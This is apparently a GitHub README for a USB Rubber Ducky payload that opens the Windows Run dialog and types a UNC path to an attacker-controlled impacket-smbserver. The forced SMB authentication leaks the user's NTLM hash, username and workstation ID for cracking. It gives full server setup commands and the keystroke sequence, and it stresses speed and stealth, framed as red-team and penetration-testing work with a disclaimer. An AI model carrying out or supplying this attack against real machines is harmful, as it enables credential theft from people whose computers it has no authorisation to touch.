# Password Hash Grabber (Windows)

This project utilizes a USB Rubber Ducky to capture Windows password hashes in less than two seconds, demonstrating a powerful method for assessing policy compliance and information security awareness. By executing a simple DuckyScript payload, it initiates a CIFS/SMB connection to a targeted listening server to obtain user hash information. This technique is effective across almost all versions of Microsoft Windows and requires minimal privileges, making it a valuable tool for penetration testers and internal red teams.

The critical component of this attack is ****impacket-smbserver from the Impacket suite, an open-source tool designed for such operations. The server needs to be set up on the target network to capture the NTLM hash, timestamp, workstation ID, and user details as Windows attempts to authenticate with the CIFS share.

## Disclaimer

The tools and scripts provided in this repository are made available for educational purposes only and are intended to be used for testing and protecting systems with the consent of the owners. The author does not take any responsibility for the misuse of these tools. It is the end user's responsibility to obey all applicable local, state, national, and international laws. The developers assume no liability and are not responsible for any misuse or damage caused by this program. Under no circumstances should this tool be used for malicious purposes. The author of this tool advocates for the responsible and ethical use of security tools. Please use this tool responsibly and ethically, ensuring that you have proper authorization before engaging any system with the techniques demonstrated by this project.

## Features

This DuckyScript is designed for rapid exfiltration of Windows password hashes by exploiting the SMB (Server Message Block) protocol. When executed, it forces a Windows machine to attempt an SMB connection to a predefined server, triggering an automatic hash exchange process part of the SMB protocol's authentication mechanism.

## Prerequisites

- **Operating System**: Tested on Windows 10 x64, version 22H2, Kali Linux 2023.4, Ubuntu 22.04.4 LTS.
- **Payload Studio**: Tested with Payload Studio Pro version 1.3.1
- **DuckyScript Version**: DuckScript 3.0 Advanced
- **Hardware**: USB Rubber Ducky (2022)

## Usage

### **Step 1: Prepare the impacket-smbserver Environment (Kali Linux)**

1. **Set Up impacket-smbserver**:
    - Verify installation by running one of the Impacket tools or check the installed version: `impacket-smbserver --version`
    - Choose a directory where you want the SMB server to store captured hashes (e.g., `/tmp/`).
    - Run an SMB server using `impacket-smbserver`, by specifying a share name and a path to the folder you want to share, for example: `sudo impacket-smbserver TMP /tmp/`
        
        ```bash
        sudo impacket-smbserver <SHARE_NAME> <PATH_TO_FOLDER>
        ```
        
    - On the Windows target machine, you can access the share by navigating to `\\[KALI_IP_ADDRESS]\TMP` in the File Explorer, where `[KALI_IP_ADDRESS]` is the IP address of your Kali VM.

### **Step 1: Prepare the impacket-smbserver Environment (Ubuntu)**

1. **Install pipx:**
    - Ensure Python3 and pip are installed first.
    - Install `pipx` using pip:
        
        ```bash
        python3 -m pip install --user pipx
        python3 -m pipx ensurepath
        ```
        
2. **Install Impacket**: 
    - With `pipx` installed, you can now proceed to install Impacket. To install the latest stable release of Impacket, run: `python3 -m pipx install impacket`
        - This command will download and install Impacket and its dependencies in an isolated environment while making the Impacket tools available system-wide.
    - Verify installation by running one of the Impacket tools or check the installed version: `impacket-smbserver --version`
3. **Set Up smbserver.py**:
    - Choose a directory where you want the SMB server to store captured hashes (e.g., `/tmp/` on Linux).
    - Run an SMB server using `impacket-smbserver`, by specifying a share name and a path to the folder you want to share, for example: `sudo impacket-smbserver TMP /var/`
        
        ```bash
        sudo impacket-smbserver <SHARE_NAME> <PATH_TO_FOLDER>
        ```
        
    - On the Windows target machine, you can access the share by navigating to `\\[KALI_IP_ADDRESS]\TMP` in the File Explorer, where `[KALI_IP_ADDRESS]` is the IP address of your Kali VM.

### Step 2: **Create the DuckyScript Payload**

- **Write the Payload**: Ensure you replace `example.com` with the actual hostname or IP address of the server running  ****`impacket-smbserver`.

### **Step 3: Deploy the Payload**

- **Load and Execute**: Load the DuckyScript payload onto your USB Rubber Ducky, plug it into the target Windows machine, and let it execute the script. The script quickly opens a Run dialog, attempts to connect to the specified CIFS share, and in the process, sends the NTLM hash to the smbserver.

### Step 4: Capture and Utilize the Hash

- **Monitor impacket-smbserver Output**: The smbserver will output the captured hash information, including the timestamp, workstation ID, user, and NTLM hash. This information can be used for further analysis or cracking attempts.

## How It Works

- **Host Setup**: Before deployment, you must set up an SMB server using Impacket's `impacket-smbserver`. This server will listen for incoming SMB connections and capture NTLM hashes passed during the authentication attempt.
- **Script Execution**: Upon plugging in the USB Rubber Ducky, the script waits for 1 second (`DELAY 1000`) to ensure the system recognizes the device. It then simulates the key combination `GUI r` to open the Run dialog.
- **Connection Initiation**: The script types `\\[HOSTNAME]\[SHARE_NAME]` and hits Enter, where `[HOSTNAME]` is the address of your SMB server and `[SHARE_NAME]` the SMB share name. This action attempts to initiate an SMB connection to the specified server.
- **Hash Capture**: As Windows tries to authenticate with the SMB server, the user's NTLM hash, username, and workstation ID are transmitted. The Impacket `impacket-smbserver` captures this information.
- **Rapid Execution**: This entire process is designed to execute in less than two seconds, showcasing the speed and stealthiness of the attack. It highlights the potential risk and impact of physical access vulnerabilities.

## Output Example

![DuckyScript Payload Results](/images/impacket_smb_results.png)

## Contributing

If you have an idea for an improvement or if you're interested in collaborating, you are welcome to contribute. Please feel free to open an issue or submit a pull request.

## License

This project is licensed under the XYZ License - see the [LICENSE](LICENSE) file for details.
